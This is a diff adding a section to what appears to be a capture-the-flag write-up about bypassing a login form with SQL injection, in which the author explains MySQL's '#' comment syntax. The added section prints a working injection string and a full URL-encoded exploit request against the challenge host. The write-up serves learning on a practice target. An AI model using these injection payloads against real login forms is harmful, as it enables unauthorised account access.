@@ -46,3 +46,18 @@ So I now needed to figure out where this had gone wrong...
 which makes the select statement:  
 `SELECT * FROM users WHERE username = '' OR ''='' AND password = '' OR ''=''`  
 and gave me the flag. However, I will return and fix my original solution when I work out the problem.
+
+I finally spotted my mistake. In standard SQL, a single-line comment is denoted with `--`. However in MySQL, a single-line comment uses `#`. So now I need to create the statement:
+```sql
+SELECT * FROM users WHERE username = '' OR username LIKE '%' #' AND password = 'pass'
+```
+so I updated the URL to do this to:
+```
+http://ctf.hackucf.org:4001?username=%27%20OR%20username%20LIKE%20%27%25%27%20%23&password=pass&iamahacker=1&debug=1
+```
+This worked and gave me the second flag:
+```
+flag{<flag1 here>}
+SELECT * FROM users WHERE username = '' OR username LIKE '%' #' AND password = 'pass'
+flag{<flag2 here>}
+```
